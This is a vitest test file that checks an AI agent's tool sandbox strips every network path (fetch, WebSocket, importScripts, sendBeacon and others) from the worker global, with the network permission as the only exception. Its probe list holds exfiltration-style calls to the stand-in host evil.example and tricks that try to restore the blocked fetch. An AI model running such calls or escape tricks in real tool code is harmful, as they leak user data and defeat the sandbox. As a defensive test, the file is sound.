import { createContext, runInContext } from "node:vm";
import { describe, expect, it } from "vitest";
import { buildToolSandboxSource } from "../agent/toolRunner";

/**
 * PR-01: the sandbox removes every network path from the worker global.
 *
 * This runs the exact worker source in a worker-like global with a fake fetch,
 * XMLHttpRequest, WebSocket and so on. A probe fails the test when its fake
 * path is called. The real browser worker uses the same source.
 */

interface ProbeResult {
  ok: boolean;
  output?: string;
  message?: string;
}

interface Probe {
  result: ProbeResult;
  calls: string[];
  context: Record<string, unknown>;
}

function workerGlobal(calls: string[], posted: ProbeResult[]): Record<string, unknown> {
  const context: Record<string, unknown> = {
    JSON,
    Date,
    Promise,
    Object,
    Array,
    String,
    Number,
    Error,
    TypeError,
    fetch: () => {
      calls.push("fetch");
      return Promise.resolve({ ok: true });
    },
    XMLHttpRequest: function XMLHttpRequest() {
      calls.push("xmlhttprequest");
    },
    EventSource: function EventSource() {
      calls.push("eventsource");
    },
    WebSocket: function WebSocket() {
      calls.push("websocket");
    },
    WebTransport: function WebTransport() {
      calls.push("webtransport");
    },
    RTCPeerConnection: function RTCPeerConnection() {
      calls.push("rtc");
    },
    importScripts: () => {
      calls.push("importscripts");
    },
    Worker: function Worker() {
      calls.push("worker");
    },
    SharedWorker: function SharedWorker() {
      calls.push("sharedworker");
    },
    BroadcastChannel: function BroadcastChannel() {
      calls.push("broadcastchannel");
    },
    navigator: {
      sendBeacon: () => {
        calls.push("sendbeacon");
        return true;
      },
    },
    localStorage: { getItem: () => null },
    sessionStorage: {},
    indexedDB: {},
  };
  context.self = context;
  context.postMessage = (message: ProbeResult) => {
    posted.push(message);
  };
  return context;
}

async function runProbe(script: string, permissions: string[]): Promise<Probe> {
  const calls: string[] = [];
  const posted: ProbeResult[] = [];
  const context = workerGlobal(calls, posted);
  createContext(context);
  runInContext(buildToolSandboxSource(script), context);
  const onmessage = context.onmessage as (event: { data: unknown }) => Promise<void>;
  await onmessage({ data: { input: {}, permissions } });
  return { result: posted[0] ?? { ok: false, message: "no reply" }, calls, context };
}

const NETWORK_PROBES: ReadonlyArray<readonly [string, string]> = [
  ["global fetch", "return await fetch('https://evil.example/leak')"],
  ["self.fetch", "return await self.fetch('https://evil.example/leak')"],
  ["globalThis.fetch", "return await globalThis.fetch('https://evil.example/leak')"],
  ["XMLHttpRequest", "return new XMLHttpRequest()"],
  ["EventSource", "return new EventSource('https://evil.example')"],
  ["WebSocket", "return new WebSocket('wss://evil.example')"],
  ["WebTransport", "return new WebTransport('https://evil.example')"],
  ["RTCPeerConnection", "return new RTCPeerConnection()"],
  ["importScripts", "return importScripts('https://evil.example/x.js')"],
  ["Worker", "return new Worker('https://evil.example/x.js')"],
  ["SharedWorker", "return new SharedWorker('https://evil.example/x.js')"],
  ["BroadcastChannel", "return new BroadcastChannel('leak')"],
  ["navigator.sendBeacon", "return navigator.sendBeacon('https://evil.example', 'leak')"],
  [
    "restore fetch",
    "self.fetch = () => { throw new Error('leak'); }; return await globalThis.fetch('https://evil.example')",
  ],
  [
    "restore with defineProperty",
    "Object.defineProperty(self, 'fetch', { value: () => 1 }); return await globalThis.fetch('x')",
  ],
];

describe("PR-01 and B2 the worker global has no network path", () => {
  it.each([["none"], ["files"]] as const)("blocks every path with the %s permission", async (permission) => {
    for (const [name, script] of NETWORK_PROBES) {
      const { result, calls } = await runProbe(script, [permission]);
      expect(calls, name).toEqual([]);
      expect(result.ok, name).toBe(false);
    }
  });

  it("does not leave a restorable network function on the global", async () => {
    const { context } = await runProbe("return 1;", ["none"]);
    for (const name of ["fetch", "XMLHttpRequest", "EventSource", "WebSocket", "importScripts"]) {
      const descriptor = Object.getOwnPropertyDescriptor(context, name);
      expect(descriptor?.value, name).toBeUndefined();
      expect(descriptor?.writable, name).toBe(false);
      expect(descriptor?.configurable, name).toBe(false);
    }
    expect(Object.isFrozen(context.navigator)).toBe(true);
  });

  it("still lets a tool with the network permission use fetch", async () => {
    const { result, calls } = await runProbe("return await fetch('https://example.com/v1')", ["network"]);
    expect(calls).toEqual(["fetch"]);
    expect(result.ok).toBe(true);
  });

  it("does not give the network permission the other paths", async () => {
    const { calls, result } = await runProbe("return new XMLHttpRequest()", ["network"]);
    expect(calls).toEqual([]);
    expect(result.ok).toBe(false);
  });
});
